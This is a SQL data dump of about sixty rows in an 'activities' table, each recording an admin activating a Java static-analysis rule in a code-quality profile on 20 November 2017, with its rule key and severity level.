INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1832, '2017-11-20 11:09:23.424', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1214;ruleKey=squid:S1214;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlBgbbGRdfPp-q6L');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1833, '2017-11-20 11:09:23.454', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1215;ruleKey=squid:S1215;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlB-bbGRdfPp-q6M');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1834, '2017-11-20 11:09:23.483', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1217;ruleKey=squid:S1217;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlCbbbGRdfPp-q6N');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1835, '2017-11-20 11:09:23.512', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1219;ruleKey=squid:S1219;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlC4bbGRdfPp-q6O');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1836, '2017-11-20 11:09:23.533', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1220;ruleKey=squid:S1220;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlDNbbGRdfPp-q6P');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1837, '2017-11-20 11:09:23.567', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1221;ruleKey=squid:S1221;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlDvbbGRdfPp-q6Q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1838, '2017-11-20 11:09:23.604', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1223;ruleKey=squid:S1223;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlEUbbGRdfPp-q6R');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1839, '2017-11-20 11:09:23.632', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1226;ruleKey=squid:S1226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlEwbbGRdfPp-q6S');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1840, '2017-11-20 11:09:23.669', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1264;ruleKey=squid:S1264;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlFVbbGRdfPp-q6T');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1841, '2017-11-20 11:09:23.71', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S128;ruleKey=squid:S128;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlF-bbGRdfPp-q6U');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1842, '2017-11-20 11:09:23.752', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1301;ruleKey=squid:S1301;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlGobbGRdfPp-q6V');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1843, '2017-11-20 11:09:23.781', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1313;ruleKey=squid:S1313;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlHFbbGRdfPp-q6W');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1844, '2017-11-20 11:09:23.818', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1317;ruleKey=squid:S1317;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlHqbbGRdfPp-q6X');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1845, '2017-11-20 11:09:23.884', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1319;ruleKey=squid:S1319;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlIsbbGRdfPp-q6Y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1846, '2017-11-20 11:09:23.973', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S135;ruleKey=squid:S135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlKFbbGRdfPp-q6Z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1847, '2017-11-20 11:09:24.047', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1444;ruleKey=squid:S1444;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlLPbbGRdfPp-q6a');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1848, '2017-11-20 11:09:24.16', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1450;ruleKey=squid:S1450;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlNAbbGRdfPp-q6b');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1849, '2017-11-20 11:09:24.184', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1452;ruleKey=squid:S1452;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlNYbbGRdfPp-q6c');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1850, '2017-11-20 11:09:24.219', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1479;ruleKey=squid:S1479;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlN7bbGRdfPp-q6d');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1851, '2017-11-20 11:09:24.256', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1481;ruleKey=squid:S1481;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlOgbbGRdfPp-q6e');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1852, '2017-11-20 11:09:24.299', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1488;ruleKey=squid:S1488;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlPLbbGRdfPp-q6f');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1853, '2017-11-20 11:09:24.338', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1596;ruleKey=squid:S1596;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlPybbGRdfPp-q6g');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1854, '2017-11-20 11:09:24.378', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1598;ruleKey=squid:S1598;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlQabbGRdfPp-q6h');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1855, '2017-11-20 11:09:24.419', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1602;ruleKey=squid:S1602;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlRDbbGRdfPp-q6i');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1856, '2017-11-20 11:09:24.448', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1604;ruleKey=squid:S1604;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlRgbbGRdfPp-q6j');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1857, '2017-11-20 11:09:24.473', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1607;ruleKey=squid:S1607;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlR5bbGRdfPp-q6k');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1858, '2017-11-20 11:09:24.511', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1610;ruleKey=squid:S1610;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlSfbbGRdfPp-q6l');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1859, '2017-11-20 11:09:24.539', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1611;ruleKey=squid:S1611;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlS7bbGRdfPp-q6m');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1860, '2017-11-20 11:09:24.576', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1612;ruleKey=squid:S1612;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlTgbbGRdfPp-q6n');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1861, '2017-11-20 11:09:24.614', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1640;ruleKey=squid:S1640;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlUGbbGRdfPp-q6o');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1862, '2017-11-20 11:09:24.686', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1643;ruleKey=squid:S1643;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlVObbGRdfPp-q6p');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1863, '2017-11-20 11:09:24.715', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1656;ruleKey=squid:S1656;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlVrbbGRdfPp-q6q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1864, '2017-11-20 11:09:24.739', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1659;ruleKey=squid:S1659;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlWDbbGRdfPp-q6r');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1865, '2017-11-20 11:09:24.803', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1700;ruleKey=squid:S1700;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlXDbbGRdfPp-q6s');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1866, '2017-11-20 11:09:24.839', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1710;ruleKey=squid:S1710;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlXnbbGRdfPp-q6t');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1867, '2017-11-20 11:09:24.895', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1751;ruleKey=squid:S1751;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlYfbbGRdfPp-q6u');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1868, '2017-11-20 11:09:24.953', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1764;ruleKey=squid:S1764;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlZZbbGRdfPp-q6v');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1869, '2017-11-20 11:09:25.009', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1844;ruleKey=squid:S1844;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlaRbbGRdfPp-q6w');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1870, '2017-11-20 11:09:25.088', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1845;ruleKey=squid:S1845;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlbgbbGRdfPp-q6x');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1871, '2017-11-20 11:09:25.125', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1849;ruleKey=squid:S1849;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlcFbbGRdfPp-q6y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1872, '2017-11-20 11:09:25.163', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1854;ruleKey=squid:S1854;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlcrbbGRdfPp-q6z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1873, '2017-11-20 11:09:25.204', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1858;ruleKey=squid:S1858;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHldUbbGRdfPp-q60');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1874, '2017-11-20 11:09:25.244', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1860;ruleKey=squid:S1860;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHld8bbGRdfPp-q61');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1875, '2017-11-20 11:09:25.283', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1862;ruleKey=squid:S1862;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlejbbGRdfPp-q62');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1876, '2017-11-20 11:09:25.324', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1871;ruleKey=squid:S1871;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlfMbbGRdfPp-q63');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1877, '2017-11-20 11:09:25.364', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1872;ruleKey=squid:S1872;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlf0bbGRdfPp-q64');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1878, '2017-11-20 11:09:25.408', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1905;ruleKey=squid:S1905;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlggbbGRdfPp-q65');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1879, '2017-11-20 11:09:25.435', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1940;ruleKey=squid:S1940;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlg7bbGRdfPp-q66');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1880, '2017-11-20 11:09:25.506', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1948;ruleKey=squid:S1948;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHliCbbGRdfPp-q67');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1881, '2017-11-20 11:09:25.55', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1989;ruleKey=squid:S1989;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHliubbGRdfPp-q68');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1882, '2017-11-20 11:09:25.581', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1994;ruleKey=squid:S1994;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHljNbbGRdfPp-q69');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1883, '2017-11-20 11:09:25.622', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2055;ruleKey=squid:S2055;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlj2bbGRdfPp-q6-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1884, '2017-11-20 11:09:25.664', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2060;ruleKey=squid:S2060;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlkgbbGRdfPp-q6_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1885, '2017-11-20 11:09:25.705', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2061;ruleKey=squid:S2061;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHllJbbGRdfPp-q7A');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1886, '2017-11-20 11:09:25.748', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2062;ruleKey=squid:S2062;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHll0bbGRdfPp-q7B');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1887, '2017-11-20 11:09:25.787', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2065;ruleKey=squid:S2065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlmbbbGRdfPp-q7C');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1888, '2017-11-20 11:09:25.842', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2066;ruleKey=squid:S2066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlnSbbGRdfPp-q7D');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1889, '2017-11-20 11:09:25.929', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2068;ruleKey=squid:S2068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlopbbGRdfPp-q7E');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1890, '2017-11-20 11:09:26.012', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2077;ruleKey=squid:S2077;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlp8bbGRdfPp-q7F');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1891, '2017-11-20 11:09:26.164', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2092;ruleKey=squid:S2092;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlsUbbGRdfPp-q7G');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1892, '2017-11-20 11:09:26.228', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2093;ruleKey=squid:S2093;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHltUbbGRdfPp-q7H');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1893, '2017-11-20 11:09:26.274', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2094;ruleKey=squid:S2094;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHluCbbGRdfPp-q7I');
